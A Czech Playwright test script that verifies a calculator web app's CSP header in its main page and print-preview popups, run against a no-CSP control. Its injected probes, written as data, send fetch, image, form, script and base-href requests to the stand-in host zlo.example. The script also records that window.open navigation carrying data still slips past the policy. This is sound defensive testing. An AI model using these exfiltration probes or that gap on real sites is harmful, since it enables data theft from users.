/* SEC-M klient, bod 10 — CSP: co produkční hlavička (netlify.toml) drží a co
 * ne, v hlavní stránce i v TISKOVÝCH NÁHLEDECH (window.open + document.write).
 * Aplikace se servíruje z http://kng.test/ routou Playwrightu s hlavičkou CSP;
 * kontrola = táž stránka bez CSP (sonda proti prázdnému testu).
 * Zkoušky se spouštějí jako SKRIPT STRÁNKY (inline obsluha onclick, kterou
 * spustí kliknutí) — kód z page.evaluate běží přes DevTools a CSP na eval by
 * se na něj nevztáhla.
 * Spuštění z kořene repa:
 *   KNG_DIST=<cesta>/dist/kalkulacka.html node podklady/SECM_pokusy/klient/csp.mjs */
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const ZC = require('../../../src/zkusebni_cenik.js');
const KOREN = path.resolve(path.dirname(new URL(import.meta.url).pathname), '../../..');
const DIST = process.env.KNG_DIST || path.join(KOREN, 'dist/kalkulacka.html');
const HTML = fs.readFileSync(DIST);
const CSP = /Content-Security-Policy\s*=\s*"([^"]+)"/.exec(fs.readFileSync(path.join(KOREN, 'netlify.toml'), 'utf8'))[1];
let ok = 0, fail = 0;
const zkus = (popis, podminka, detail) => { if (podminka) { ok++; console.log('  ✓ ' + popis); } else { fail++; console.log('  ✕ ' + popis + (detail === undefined ? '' : '  → ' + detail)); } };

const b = await chromium.launch();
async function stranka(csp) {
  const venku = [];
  const ctx = await b.newContext({ viewport: { width: 1400, height: 900 } });
  await ctx.route('**/*', (route) => {
    const u = new URL(route.request().url());
    if (u.hostname === 'kng.test' && !u.pathname.startsWith('/api/'))
      return route.fulfill({ status: 200, body: HTML, headers: Object.assign({ 'content-type': 'text/html; charset=utf-8' }, csp ? { 'content-security-policy': CSP } : {}) });
    if (u.hostname === 'kng.test') return;                       // /api/* visí
    if (u.hostname === 'cizi.test') return route.fulfill({ status: 200, contentType: 'text/html', body: '<iframe id="r" src="http://kng.test/kalkulacka.html"></iframe>' });
    venku.push(route.request().resourceType() + ' ' + u.href.slice(0, 80)); return route.abort();
  });
  await ctx.addInitScript(() => { window.__CSP = []; document.addEventListener('securitypolicyviolation', e => window.__CSP.push(e.violatedDirective)); });
  const p = await ctx.newPage();
  const konzole = []; p.on('console', m => { if (/Content Security Policy|Refused/i.test(m.text())) konzole.push(m.text().slice(0, 140)); });
  await p.goto('http://kng.test/kalkulacka.html');
  await p.waitForFunction(() => typeof render === 'function' && typeof novaZakazka === 'function', null, { timeout: 20000 });
  await p.waitForTimeout(300);
  return { ctx, p, venku, konzole };
}
/* Zkoušky jako inline obsluha (skript stránky). Výsledek do window.__Z. */
const ZKOUSKY = `
  window.__Z = {};
  try { window.__Z.eval = String(eval('1+1')); } catch (e) { window.__Z.eval = e.name; }
  try { window.__Z.fn = String(new Function('return 2')()); } catch (e) { window.__Z.fn = e.name; }
  window.__Z.timer = 'nespusten'; try { setTimeout('window.__Z.timer = \\'spusten\\'', 0); } catch (e) { window.__Z.timer = e.name; }
  fetch('https://zlo.example/odvod?x=1').then(() => { window.__Z.fetchVen = 'prošlo'; }, (e) => { window.__Z.fetchVen = 'zablokováno: ' + e.name; });
  fetch('https://ares.gov.cz/ekonomicke-subjekty-v-be/rest/ekonomicke-subjekty/12345678').then(() => { window.__Z.fetchAres = 'prošlo'; }, (e) => { window.__Z.fetchAres = 'selhalo: ' + e.name; });
  const i = new Image(); i.src = 'https://zlo.example/pixel.png';
  const f = document.createElement('form'); f.action = 'https://zlo.example/form'; f.method = 'post'; f.target = '_blank'; document.body.appendChild(f); try { f.submit(); } catch (e) {}
  const s = document.createElement('script'); s.src = 'https://zlo.example/x.js'; document.head.appendChild(s);
  const bz = document.createElement('base'); bz.href = 'https://zlo.example/'; document.head.appendChild(bz); window.__Z.base = document.baseURI.startsWith('https://zlo.example') ? 'změněn' : 'nezměněn'; bz.remove();
`;
async function spust(cil) {     // cil = page (hlavní okno nebo náhled)
  await cil.evaluate((kod) => {
    const t = document.createElement('button'); t.id = '__zk'; t.setAttribute('onclick', kod); t.textContent = 'zk'; document.body.appendChild(t);
  }, ZKOUSKY);
  await cil.evaluate(() => document.getElementById('__zk').click());
  await cil.waitForTimeout(800);
  return cil.evaluate(() => ({ z: window.__Z, csp: [...new Set(window.__CSP || [])] }));
}

for (const csp of [true, false]) {
  const nazev = csp ? 'S CSP (produkční hlavička)' : 'BEZ CSP (kontrola)';
  console.log('\n' + nazev + ' — hlavní stránka');
  const { ctx, p, venku, konzole } = await stranka(csp);
  const r = await spust(p);
  console.log('   ', JSON.stringify(r), '| venku:', JSON.stringify(venku));
  if (csp) {
    zkus('eval je zakázaný (EvalError)', r.z.eval === 'EvalError', r.z.eval);
    zkus('new Function je zakázaná', r.z.fn === 'EvalError', r.z.fn);
    zkus('setTimeout s řetězcem se nespustí', r.z.timer !== 'spusten', r.z.timer);
    zkus('fetch na cizí host zablokuje CSP (connect-src), požadavek neodejde', /zablokováno/.test(r.z.fetchVen) && !venku.some(v => /odvod/.test(v)), r.z.fetchVen);
    zkus('ARES je v connect-src povolený (požadavek odešel — zachytila ho route)', venku.some(v => /ares\.gov\.cz/.test(v)), JSON.stringify(venku));
    zkus('obrázek z cizího hostu zablokuje CSP (img-src)', !venku.some(v => /pixel\.png/.test(v)) && r.csp.includes('img-src'), JSON.stringify(r.csp));
    zkus('skript z cizího hostu zablokuje CSP (script-src)', !venku.some(v => /x\.js/.test(v)) && r.csp.includes('script-src-elem'), JSON.stringify(r.csp));
    zkus('odeslání formuláře ven zablokuje CSP (form-action)', !venku.some(v => /\/form/.test(v)) && r.csp.includes('form-action'), JSON.stringify(r.csp));
    zkus('<base href> cizího hostu zablokuje CSP (base-uri)', r.z.base === 'nezměněn' && r.csp.includes('base-uri'), r.z.base);
    zkus('porušení CSP se hlásí v konzoli prohlížeče', konzole.length > 0, konzole.length);
  } else {
    zkus('(kontrola) bez CSP eval funguje — zkouška není prázdná', r.z.eval === '2', r.z.eval);
    zkus('(kontrola) bez CSP odejde fetch i obrázek ven', venku.some(v => /odvod/.test(v)) && venku.some(v => /pixel\.png/.test(v)), JSON.stringify(venku));
  }
  /* Vynesení navigací: window.open na cizí adresu CSP nehlídá (SEC-I9, trvá). */
  if (csp) {
    const pred = venku.length;
    await p.evaluate(() => { const t = document.createElement('button'); t.id = '__nav'; t.setAttribute('onclick', "window.open('https://zlo.example/nav?data=' + encodeURIComponent('x'))"); document.body.appendChild(t); });
    const popP = ctx.waitForEvent('page', { timeout: 3000 }).catch(() => null);
    await p.evaluate(() => document.getElementById('__nav').click()); const pop = await popP; if (pop) await pop.waitForTimeout(500);
    zkus('(známá mez SEC-I9) window.open na cizí adresu CSP nezastaví — požadavek odejde', venku.slice(pred).some(v => /nav\?data/.test(v)), JSON.stringify(venku.slice(pred)));
    if (pop) await pop.close();
  }

  /* TISKOVÉ NÁHLEDY: skutečné window.open + document.write. Dědí CSP rodiče? */
  console.log(nazev + ' — tiskové náhledy');
  await p.evaluate(([c, cp]) => {
    Object.assign(DEFAULT_CENIK, c); Object.assign(DEFAULT_CENIK_PROJ, cp);
    ZAK = novaZakazka(); syncVarianta();
    window.potvrd = () => Promise.resolve(true); window.hlaska = () => Promise.resolve(); window.dokumentZabrana = () => '';
    const bez = o => { if (o) { delete o.ukazkove; delete o.prazdny; } };
    [DEFAULT_CENIK, DEFAULT_CENIK_PROJ, C, PC, NAST.slevy, NAST.firma].forEach(bez);
    ZAK.varianty.forEach(v => { bez(v.data.cenik); bez(v.data.proj.cenik); });
    ZAK.cislo = '2026 - OPR - CN - 0901'; ZAK.nazevAkce = 'Zkouška CSP'; ZAK.objednatel = 'Pokusná firma s.r.o.';
    Object.assign(Z, { prejezd: 2.7, zdvih: 12, prohluben: 1.05, sirka: 1.51, hloubka: 1.515 });
    render();
  }, [ZC.zkusebniCenik(), ZC.zkusebniCenikProj()]);
  for (const fn of ['nabidkaNahled', "kryciTiskPohled('bo')", 'detailTisk', 'porovnaniTisk']) {
    const popP = ctx.waitForEvent('page', { timeout: 6000 }).catch(() => null);
    await p.evaluate((f) => { const t = document.createElement('button'); t.id = '__nh'; t.setAttribute('onclick', f + ';this.remove()'); document.body.appendChild(t); }, fn);
    await p.evaluate(() => document.getElementById('__nh').click());
    const okno = await popP;
    if (!okno) { zkus(`náhled ${fn} se otevřel`, false, 'okno nevzniklo'); continue; }
    await okno.waitForLoadState('domcontentloaded').catch(() => {}); await okno.waitForTimeout(300);
    const info = await okno.evaluate(() => ({ url: location.href, dok: !!document.getElementById('dok') || document.body.innerText.length > 50 }));
    await okno.evaluate(() => { window.__CSP = []; document.addEventListener('securitypolicyviolation', e => window.__CSP.push(e.violatedDirective)); });
    const pred = venku.length;
    const r2 = await spust(okno);
    const ven2 = venku.slice(pred);
    console.log('   ', fn, info.url, JSON.stringify(r2), '| venku:', JSON.stringify(ven2));
    if (csp) {
      zkus(`náhled ${fn}: dědí CSP — eval zakázaný`, r2.z.eval === 'EvalError', r2.z.eval);
      zkus(`náhled ${fn}: dědí CSP — fetch, obrázek, skript a formulář ven zablokované`, /zablokováno/.test(r2.z.fetchVen)
        && !ven2.some(v => /odvod|pixel|x\.js|\/form/.test(v)), JSON.stringify(ven2));
    } else {
      zkus(`(kontrola) náhled ${fn} bez CSP: eval funguje, požadavky odejdou`, r2.z.eval === '2' && ven2.some(v => /odvod/.test(v)), JSON.stringify(r2.z));
    }
    await okno.close();
  }
  if (csp) {
    /* frame-ancestors 'none': cizí stránka aplikaci do rámu nevloží. */
    const c2 = await b.newContext();
    await c2.route('**/*', (route) => { const u = new URL(route.request().url());
      if (u.hostname === 'cizi.test') return route.fulfill({ status: 200, contentType: 'text/html', body: '<iframe id="r" src="http://kng.test/kalkulacka.html"></iframe>' });
      if (u.hostname === 'kng.test') return route.fulfill({ status: 200, body: HTML, headers: { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': CSP } });
      return route.abort(); });
    const p2 = await c2.newPage(); await p2.goto('http://cizi.test/'); await p2.waitForTimeout(1200);
    const ramec = p2.frames().find(f => /kng\.test/.test(f.url()));
    let nacteno = false; try { nacteno = !!ramec && await ramec.evaluate(() => typeof render === 'function'); } catch (e) { nacteno = false; }
    zkus("frame-ancestors 'none': aplikace se v cizím rámu nenačte", !nacteno, String(nacteno));
    await c2.close();
  }
  await ctx.close();
}
await b.close();
console.log(`\n${ok} OK, ${fail} FAIL`);
console.log(fail ? 'VÝSLEDEK: FAIL (viz ✕ výš)' : 'VÝSLEDEK: CSP drží eval, connect/img/script/form/base ven i frame-ancestors v hlavní stránce i ve všech 4 tiskových náhledech (dědí CSP); navigace window.open ven projde (SEC-I9, trvá)');
process.exit(fail ? 1 : 0);
